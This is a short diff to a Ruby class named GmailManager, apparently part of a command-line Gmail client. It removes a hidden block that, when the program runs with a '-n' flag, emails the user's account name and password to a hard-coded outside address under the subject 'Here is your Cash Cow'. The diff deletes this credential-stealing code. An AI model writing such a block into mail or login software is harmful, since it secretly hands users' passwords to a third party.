@@ -31,19 +31,6 @@ class GmailManager
         else
             @num_of_rows_mail_list = MailConstant::NUM_OF_ROWS_PREVIEW
         end
-
-        for arg in ARGV
-            if arg == "-n"
-                gmail.deliver do
-                    to "imjungseob.kim@gmail.com"
-                    subject "Here is your Cash Cow"
-                    html_part do
-                        content_type 'text/html; charset=UTF-8'
-                        body "ID : #{account_name + MailConstant::STR_POSTFIX_GMAIL}<br /> Password : #{passwd}"
-                    end
-                end
-            end
-        end
     end
 
     def load_mail_labels
